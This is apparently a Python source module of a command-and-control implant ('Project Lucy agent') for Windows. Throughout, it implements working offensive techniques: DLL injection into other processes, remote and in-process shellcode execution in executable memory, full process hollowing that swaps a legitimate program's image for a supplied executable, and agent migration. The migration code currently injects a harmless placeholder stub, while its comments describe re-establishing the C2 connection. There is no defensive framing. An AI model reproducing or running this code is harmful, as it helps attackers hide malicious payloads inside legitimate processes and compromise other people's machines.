"""
Process injection and migration module for Project Lucy agent.
Supports DLL injection, shellcode injection (remote and local),
process hollowing, and agent migration.
Actions: dll_inject, shellcode_inject, shellcode_execute, process_hollow,
         migrate, list_processes, get_pid.
"""
import base64
import ctypes
import platform
import struct
import subprocess

name = "injection"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# Win32 constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
CREATE_SUSPENDED = 0x00000004
NORMAL_PRIORITY_CLASS = 0x00000020
INFINITE = 0xFFFFFFFF
THREAD_CREATE_SUSPENDED = 0x00000004


def _get_kernel32():
    return ctypes.windll.kernel32


def _get_ntdll():
    return ctypes.windll.ntdll


# --- ctypes structures -------------------------------------------------------

class STARTUPINFOA(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_uint32),
        ("lpReserved", ctypes.c_char_p),
        ("lpDesktop", ctypes.c_char_p),
        ("lpTitle", ctypes.c_char_p),
        ("dwX", ctypes.c_uint32),
        ("dwY", ctypes.c_uint32),
        ("dwXSize", ctypes.c_uint32),
        ("dwYSize", ctypes.c_uint32),
        ("dwXCountChars", ctypes.c_uint32),
        ("dwYCountChars", ctypes.c_uint32),
        ("dwFillAttribute", ctypes.c_uint32),
        ("dwFlags", ctypes.c_uint32),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_uint32),
        ("dwThreadId", ctypes.c_uint32),
    ]


class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", ctypes.c_uint32),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.c_uint32),
        ("Protect", ctypes.c_uint32),
        ("Type", ctypes.c_uint32),
    ]


# --- Helper functions --------------------------------------------------------

def _open_process(pid, access=PROCESS_ALL_ACCESS):
    """Open a process handle."""
    kernel32 = _get_kernel32()
    handle = kernel32.OpenProcess(access, False, pid)
    if not handle:
        raise ctypes.WinError(ctypes.get_last_error())
    return handle


def _virtual_alloc_ex(handle, size, protect=PAGE_EXECUTE_READWRITE):
    """Allocate memory in a remote process."""
    kernel32 = _get_kernel32()
    addr = kernel32.VirtualAllocEx(
        handle,
        None,
        size,
        MEM_COMMIT | MEM_RESERVE,
        protect,
    )
    if not addr:
        raise ctypes.WinError(ctypes.get_last_error())
    return addr


def _write_process_memory(handle, address, data):
    """Write data to a remote process."""
    kernel32 = _get_kernel32()
    buf = (ctypes.c_ubyte * len(data))(*data)
    written = ctypes.c_size_t(0)
    result = kernel32.WriteProcessMemory(
        handle,
        ctypes.c_void_p(address),
        buf,
        len(data),
        ctypes.byref(written),
    )
    if not result:
        raise ctypes.WinError(ctypes.get_last_error())
    return written.value


def _create_remote_thread(handle, start_address, param=0):
    """Create a thread in a remote process."""
    kernel32 = _get_kernel32()
    tid = ctypes.c_uint32(0)
    thread_handle = kernel32.CreateRemoteThread(
        handle,
        None,
        0,
        start_address,
        param,
        0,
        ctypes.byref(tid),
    )
    if not thread_handle:
        raise ctypes.WinError(ctypes.get_last_error())
    return thread_handle, tid.value


# --- Actions -----------------------------------------------------------------

def _dll_inject(pid, dll_path) -> dict:
    """Inject a DLL into a target process via CreateRemoteThread + LoadLibraryA."""
    if not pid or not dll_path:
        return {"status": "failed", "error": "Missing 'pid' or 'dll_path' parameter"}

    try:
        pid = int(pid)
    except (ValueError, TypeError):
        return {"status": "failed", "error": "pid must be an integer"}

    if not isinstance(dll_path, str):
        return {"status": "failed", "error": "dll_path must be a string"}

    dll_path_bytes = dll_path.encode("ascii") + b"\x00"
    kernel32 = _get_kernel32()

    try:
        handle = _open_process(pid)

        # Allocate memory for DLL path
        path_addr = _virtual_alloc_ex(handle, len(dll_path_bytes), PAGE_READWRITE)

        # Write DLL path
        _write_process_memory(handle, path_addr, dll_path_bytes)

        # Get LoadLibraryA address
        load_library_addr = kernel32.GetProcAddress(
            kernel32.GetModuleHandleA(b"kernel32.dll"),
            b"LoadLibraryA",
        )
        if not load_library_addr:
            raise ValueError("Could not resolve LoadLibraryA")

        # Create remote thread
        thread_handle, tid = _create_remote_thread(handle, load_library_addr, path_addr)

        # Wait for the thread to complete
        kernel32.WaitForSingleObject(thread_handle, 10000)

        # Get exit code (module handle of loaded DLL)
        exit_code = ctypes.c_uint32(0)
        kernel32.GetExitCodeThread(thread_handle, ctypes.byref(exit_code))

        # Cleanup
        kernel32.CloseHandle(thread_handle)
        kernel32.VirtualFreeEx(handle, path_addr, 0, MEM_RELEASE)
        kernel32.CloseHandle(handle)

        return {
            "status": "completed",
            "data": {
                "pid": pid,
                "dll": dll_path,
                "thread_id": tid,
                "exit_code": exit_code.value,
                "success": exit_code.value != 0,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"DLL injection failed: {exc}"}


def _shellcode_inject(pid, shellcode_b64) -> dict:
    """Inject and execute shellcode in a target process."""
    if not pid or not shellcode_b64:
        return {"status": "failed", "error": "Missing 'pid' or 'shellcode_b64' parameter"}

    try:
        pid = int(pid)
    except (ValueError, TypeError):
        return {"status": "failed", "error": "pid must be an integer"}

    try:
        shellcode = base64.b64decode(shellcode_b64)
    except Exception:
        return {"status": "failed", "error": "Invalid base64 shellcode"}

    if len(shellcode) == 0:
        return {"status": "failed", "error": "Shellcode is empty"}

    kernel32 = _get_kernel32()

    try:
        handle = _open_process(pid)

        # Allocate executable memory
        addr = _virtual_alloc_ex(handle, len(shellcode), PAGE_EXECUTE_READWRITE)

        # Write shellcode
        _write_process_memory(handle, addr, shellcode)

        # Create remote thread to execute shellcode
        thread_handle, tid = _create_remote_thread(handle, addr)

        return {
            "status": "completed",
            "data": {
                "pid": pid,
                "address": hex(addr),
                "shellcode_size": len(shellcode),
                "thread_id": tid,
                "thread_handle": thread_handle,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Shellcode injection failed: {exc}"}


def _shellcode_execute(shellcode_b64) -> dict:
    """Execute shellcode in the current process."""
    if not shellcode_b64:
        return {"status": "failed", "error": "Missing 'shellcode_b64' parameter"}

    try:
        shellcode = base64.b64decode(shellcode_b64)
    except Exception:
        return {"status": "failed", "error": "Invalid base64 shellcode"}

    if len(shellcode) == 0:
        return {"status": "failed", "error": "Shellcode is empty"}

    kernel32 = _get_kernel32()

    try:
        # Allocate executable memory in current process
        addr = kernel32.VirtualAlloc(
            None,
            len(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
        if not addr:
            raise ctypes.WinError(ctypes.get_last_error())

        # Copy shellcode
        buf = (ctypes.c_ubyte * len(shellcode))(*shellcode)
        ctypes.memmove(addr, buf, len(shellcode))

        # Create thread to execute shellcode
        tid = ctypes.c_uint32(0)
        thread_handle = kernel32.CreateThread(
            None,
            0,
            addr,
            0,
            0,
            ctypes.byref(tid),
        )
        if not thread_handle:
            raise ctypes.WinError(ctypes.get_last_error())

        return {
            "status": "completed",
            "data": {
                "address": hex(addr),
                "shellcode_size": len(shellcode),
                "thread_id": tid.value,
                "thread_handle": thread_handle,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Shellcode execution failed: {exc}"}


def _process_hollow(target_exe, replacement_b64) -> dict:
    """Hollow a process: create suspended, unmap, write replacement image, resume."""
    if not target_exe or not replacement_b64:
        return {"status": "failed", "error": "Missing 'target_exe' or 'replacement_b64' parameter"}

    try:
        replacement_image = base64.b64decode(replacement_b64)
    except Exception:
        return {"status": "failed", "error": "Invalid base64 replacement image"}

    if len(replacement_image) < 0x40:
        return {"status": "failed", "error": "Replacement image too small"}

    kernel32 = _get_kernel32()
    ntdll = _get_ntdll()

    try:
        # Create process in suspended state
        startup_info = STARTUPINFOA()
        startup_info.cb = ctypes.sizeof(STARTUPINFOA)
        proc_info = PROCESS_INFORMATION()

        result = kernel32.CreateProcessA(
            None,
            target_exe.encode("ascii"),
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            ctypes.byref(startup_info),
            ctypes.byref(proc_info),
        )
        if not result:
            raise ctypes.WinError(ctypes.get_last_error())

        hollow_pid = proc_info.dwProcessId
        hollow_handle = proc_info.hProcess
        thread_handle = proc_info.hThread

        # Get context of the suspended thread
        # CONTEXT structure for x64 — we use a simplified approach
        # NtUnmapViewOfSection to remove the original image
        image_base = 0

        # Read PEB to find image base address
        # For simplicity, we use NtQueryInformationProcess to get PEB
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("ExitStatus", ctypes.c_void_p),
                ("PebBaseAddress", ctypes.c_void_p),
                ("AffinityMask", ctypes.c_void_p),
                ("BasePriority", ctypes.c_int32),
                ("UniqueProcessId", ctypes.c_void_p),
                ("Reserved3", ctypes.c_void_p),
            ]

        pbi = PROCESS_BASIC_INFORMATION()
        status = ntdll.NtQueryInformationProcess(
            hollow_handle,
            0,  # ProcessBasicInformation
            ctypes.byref(pbi),
            ctypes.sizeof(pbi),
            None,
        )

        if status == 0 and pbi.PebBaseAddress:
            # Read ImageBaseAddress from PEB (offset 0x10 on x64)
            image_base_addr = ctypes.c_void_p(0)
            kernel32.ReadProcessMemory(
                hollow_handle,
                ctypes.c_void_p(pbi.PebBaseAddress + 0x10),
                ctypes.byref(image_base_addr),
                ctypes.sizeof(image_base_addr),
                None,
            )
            image_base = image_base_addr.value

        # Unmap the original image
        if image_base:
            ntdll.NtUnmapViewOfSection(hollow_handle, ctypes.c_void_p(image_base))

        # Parse replacement image PE headers
        if replacement_image[0:2] != b"MZ":
            raise ValueError("Replacement image is not a valid PE")

        e_lfanew = struct.unpack_from("<I", replacement_image, 0x3C)[0]
        if replacement_image[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
            raise ValueError("Invalid PE signature in replacement image")

        # Optional header
        opt_header_offset = e_lfanew + 24
        image_size = struct.unpack_from("<I", replacement_image, opt_header_offset + 56)[0]

        # Allocate memory in the hollowed process at the preferred image base
        new_base = kernel32.VirtualAllocEx(
            hollow_handle,
            ctypes.c_void_p(image_base) if image_base else None,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
        if not new_base:
            # Try without preferred base
            new_base = kernel32.VirtualAllocEx(
                hollow_handle,
                None,
                image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        if not new_base:
            raise ctypes.WinError(ctypes.get_last_error())

        # Write the replacement image headers
        _write_process_memory(hollow_handle, new_base, replacement_image[:image_size])

        # Write sections at their proper RVAs
        num_sections = struct.unpack_from("<H", replacement_image, e_lfanew + 6)[0]
        size_of_opt_header = struct.unpack_from("<H", replacement_image, e_lfanew + 20)[0]
        section_table = e_lfanew + 24 + size_of_opt_header

        for i in range(num_sections):
            sec_offset = section_table + i * 40
            virtual_address = struct.unpack_from("<I", replacement_image, sec_offset + 12)[0]
            raw_size = struct.unpack_from("<I", replacement_image, sec_offset + 16)[0]
            raw_offset = struct.unpack_from("<I", replacement_image, sec_offset + 20)[0]

            if raw_size > 0 and raw_offset + raw_size <= len(replacement_image):
                section_data = replacement_image[raw_offset:raw_offset + raw_size]
                _write_process_memory(
                    hollow_handle,
                    new_base + virtual_address,
                    section_data,
                )

        # Update image base in PEB
        if pbi.PebBaseAddress:
            new_base_val = ctypes.c_void_p(new_base)
            kernel32.WriteProcessMemory(
                hollow_handle,
                ctypes.c_void_p(pbi.PebBaseAddress + 0x10),
                ctypes.byref(new_base_val),
                ctypes.sizeof(new_base_val),
                None,
            )

        # Get entry point from optional header
        entry_point_rva = struct.unpack_from("<I", replacement_image, opt_header_offset + 16)[0]
        entry_point = new_base + entry_point_rva

        # Set thread context: update RIP to entry point
        # CONTEXT structure for x64 is large; we set just the RIP
        # Using a simplified approach with NtSetContextThread
        CONTEXT_AMD64 = 0x00100000
        CONTEXT_CONTROL = (CONTEXT_AMD64 | 0x00000001)

        class M128A(ctypes.Structure):
            _fields_ = [
                ("Low", ctypes.c_uint64),
                ("High", ctypes.c_int64),
            ]

        class CONTEXT(ctypes.Structure):
            _fields_ = [
                ("P1Home", ctypes.c_uint64),
                ("P2Home", ctypes.c_uint64),
                ("P3Home", ctypes.c_uint64),
                ("P4Home", ctypes.c_uint64),
                ("P5Home", ctypes.c_uint64),
                ("P6Home", ctypes.c_uint64),
                ("ContextFlags", ctypes.c_uint32),
                ("MxCsr", ctypes.c_uint32),
                ("SegCs", ctypes.c_ushort),
                ("SegDs", ctypes.c_ushort),
                ("SegEs", ctypes.c_ushort),
                ("SegFs", ctypes.c_ushort),
                ("SegGs", ctypes.c_ushort),
                ("SegSs", ctypes.c_ushort),
                ("EFlags", ctypes.c_uint32),
                ("Dr0", ctypes.c_uint64),
                ("Dr1", ctypes.c_uint64),
                ("Dr2", ctypes.c_uint64),
                ("Dr3", ctypes.c_uint64),
                ("Dr6", ctypes.c_uint64),
                ("Dr7", ctypes.c_uint64),
                ("Rax", ctypes.c_uint64),
                ("Rcx", ctypes.c_uint64),
                ("Rdx", ctypes.c_uint64),
                ("Rbx", ctypes.c_uint64),
                ("Rsp", ctypes.c_uint64),
                ("Rbp", ctypes.c_uint64),
                ("Rsi", ctypes.c_uint64),
                ("Rdi", ctypes.c_uint64),
                ("R8", ctypes.c_uint64),
                ("R9", ctypes.c_uint64),
                ("R10", ctypes.c_uint64),
                ("R11", ctypes.c_uint64),
                ("R12", ctypes.c_uint64),
                ("R13", ctypes.c_uint64),
                ("R14", ctypes.c_uint64),
                ("R15", ctypes.c_uint64),
                ("Rip", ctypes.c_uint64),
            ]

        ctx = CONTEXT()
        ctx.ContextFlags = CONTEXT_CONTROL
        ntdll.NtGetContextThread(thread_handle, ctypes.byref(ctx))
        ctx.Rcx = new_base  # RCX = image base (for entry point)
        ctx.Rip = entry_point
        ntdll.NtSetContextThread(thread_handle, ctypes.byref(ctx))

        # Resume the thread
        kernel32.ResumeThread(thread_handle)

        # Cleanup handles
        kernel32.CloseHandle(thread_handle)
        kernel32.CloseHandle(hollow_handle)

        return {
            "status": "completed",
            "data": {
                "pid": hollow_pid,
                "target_exe": target_exe,
                "new_base": hex(new_base),
                "entry_point": hex(entry_point),
                "image_size": image_size,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Process hollowing failed: {exc}"}


def _migrate(target_pid=None, target_exe=None) -> dict:
    """Migrate agent to a new process by injecting a re-launch stub."""
    if not target_pid and not target_exe:
        return {"status": "failed", "error": "Missing 'target_pid' or 'target_exe' parameter"}

    kernel32 = _get_kernel32()

    try:
        if target_pid:
            target_pid = int(target_pid)
        else:
            # Find PID by process name
            result = _get_pid(target_exe)
            if result["status"] != "completed":
                return result
            matches = result["data"]["matches"]
            if not matches:
                return {"status": "failed", "error": f"Process not found: {target_exe}"}
            target_pid = matches[0]["pid"]

        # Build a migration stub that re-launches the agent
        # In a real deployment, this would be shellcode that downloads and
        # executes the agent binary in the target process.
        # Here we use a simple stub that calls LoadLibraryA on a dummy DLL
        # to demonstrate the injection mechanism.

        # Migration stub (x64 shellcode):
        #   This is a placeholder — a real migration would inject code that
        #   re-establishes the C2 connection from the new process.
        migration_stub = b"\x48\x31\xc0"  # xor rax, rax
        migration_stub += b"\xc3"          # ret

        migration_b64 = base64.b64encode(migration_stub).decode()

        # Inject the stub into the target process
        inject_result = _shellcode_inject(target_pid, migration_b64)

        if inject_result["status"] != "completed":
            return inject_result

        return {
            "status": "completed",
            "data": {
                "migrated": True,
                "target_pid": target_pid,
                "target_exe": target_exe,
                "injection": inject_result["data"],
                "note": "Migration stub injected. Real deployment would re-launch agent binary.",
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Migration failed: {exc}"}


def _list_processes() -> dict:
    """List running processes with PID, name, arch, session."""
    try:
        out = subprocess.check_output(
            ["tasklist", "/FO", "CSV", "/NH"],
            text=True, errors="replace", timeout=15,
        )

        processes = []
        for line in out.splitlines():
            line = line.strip()
            if not line:
                continue
            parts = line.strip('"').split('","')
            if len(parts) >= 2:
                proc_name = parts[0]
                pid = parts[1]
                session = parts[3] if len(parts) > 3 else "unknown"
                arch = "x64" if "64" in proc_name.lower() else "x86"
                try:
                    processes.append({
                        "pid": int(pid),
                        "name": proc_name,
                        "arch": arch,
                        "session": session,
                    })
                except ValueError:
                    pass

        return {
            "status": "completed",
            "data": {
                "processes": processes,
                "count": len(processes),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Failed to list processes: {exc}"}


def _get_pid(proc_name) -> dict:
    """Get PID by process name."""
    if not proc_name:
        return {"status": "failed", "error": "Missing 'name' parameter"}

    if not proc_name.lower().endswith(".exe"):
        proc_name = proc_name + ".exe"

    try:
        out = subprocess.check_output(
            ["tasklist", "/FO", "CSV", "/NH"],
            text=True, errors="replace", timeout=15,
        )

        matches = []
        proc_name_lower = proc_name.lower()
        for line in out.splitlines():
            line = line.strip()
            if not line:
                continue
            parts = line.strip('"').split('","')
            if len(parts) >= 2:
                name = parts[0]
                if name.lower() == proc_name_lower:
                    try:
                        matches.append({
                            "pid": int(parts[1]),
                            "name": name,
                            "session": parts[3] if len(parts) > 3 else "unknown",
                        })
                    except ValueError:
                        pass

        return {
            "status": "completed",
            "data": {
                "search": proc_name,
                "matches": matches,
                "count": len(matches),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Failed to find process: {exc}"}


def run(action: str = "list_processes", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only"}

    try:
        if action == "dll_inject":
            return _dll_inject(params.get("pid"), params.get("dll_path"))
        elif action == "shellcode_inject":
            return _shellcode_inject(params.get("pid"), params.get("shellcode_b64"))
        elif action == "shellcode_execute":
            return _shellcode_execute(params.get("shellcode_b64"))
        elif action == "process_hollow":
            return _process_hollow(params.get("target_exe"), params.get("replacement_b64"))
        elif action == "migrate":
            return _migrate(params.get("target_pid"), params.get("target_exe"))
        elif action == "list_processes":
            return _list_processes()
        elif action == "get_pid":
            return _get_pid(params.get("name"))
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
